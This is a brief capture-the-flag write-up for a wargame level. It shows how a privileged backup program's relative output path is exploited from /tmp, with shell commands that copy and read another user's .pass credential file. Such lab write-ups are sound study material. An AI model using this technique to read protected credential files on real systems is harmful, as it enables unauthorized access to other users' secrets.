# Level08

## The Program

- We have a program that creates a backup of the file passed as argument.
- It is backuped in the `./backup` folder.
- We have permissions to read this backup.

## The Goal

- The goal is to provide the path to `level09`'s `.pass` as an argument, in order to read its contents.
  But we've run into a problem:

```console
$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

- In order to create the backup file, the program concatenates two strings: `./backup` and the argument.
- But as the path `./backups/home/users/level09` do not exist, it can't create the backup file.
- And we don't have the rights to create folders in the current directory.

```console
$ mkdir -p ./backups/home/users/level09
mkdir: cannot create directory `./backups/home': Permission denied
```

- The backup folder is accessed via a relative path which depends on the directory in which the program is run.
- Moving to `/tmp/` will solve the problem as we have writings rights there.

## The Hack

```console
$ cd /tmp/
$ mkdir -p backups/home/users/level09
$ ~/level08 /home/users/level09/.pass
$ cat backups/home/users/level09/.pass
```
